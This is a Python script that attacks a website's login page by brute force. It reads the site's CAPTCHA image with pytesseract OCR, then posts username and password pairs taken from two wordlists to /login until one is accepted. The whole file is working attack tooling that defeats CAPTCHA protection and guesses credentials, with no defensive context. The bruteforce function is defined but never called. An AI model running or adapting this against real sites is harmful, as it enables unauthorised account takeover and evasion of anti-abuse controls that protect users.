#!/usr/bin/env python3
import requests
import pytesseract
from PIL import Image
from io import BytesIO
import argparse

def program():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", dest="url", required=True, help="enter URL address")
    parse.add_argument("-f", "--filepath", dest="user", required=True, help="enter wordlist path")
    parse.add_argument("-p", "--passfile", dest="password", required=True, help="enter password wordlist path")
    return parse.parse_args()

args = program()
loginURL = (f"{args.url}/login")
captchaURL = (f"{args.url}/captcha")
session = requests.Session()

def getCaptcha():
    session.get(loginURL)
    response = session.get(captchaURL)
    image = Image.open(BytesIO(response.content))
    text = pytesseract.image_to_string(image, config="--psm 7 digits")
    return image, text.strip()

image, text = getCaptcha()
userpath = args.user
with open(userpath, "r", encoding="utf-8", errors="ignore") as x:
    username = x.read().splitlines()
filepath = args.password
with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.read().splitlines()

def bruteforce(user, password):
    for username in user:
        for pswd in password:
            while True:
                _, attempt = getCaptcha()
                data = {
                    'username': username,
                    'password': pswd,
                    'captcha': attempt
                }
                response = session.post(loginURL, data=data)
                login = (f"username: {username}, password: {pswd}, captcha: {attempt}")
                if "CAPTCHA failed" in response.text:
                    print(f"[-] {login}: captcha failure")
                    continue
                elif "Invalid username or password" in response.text:
                    print(f"[-] {login}: wrong credentials")
                    break
                else:
                    print(f"\n[+] {login}: successful attempt\n")
                    return username, pswd
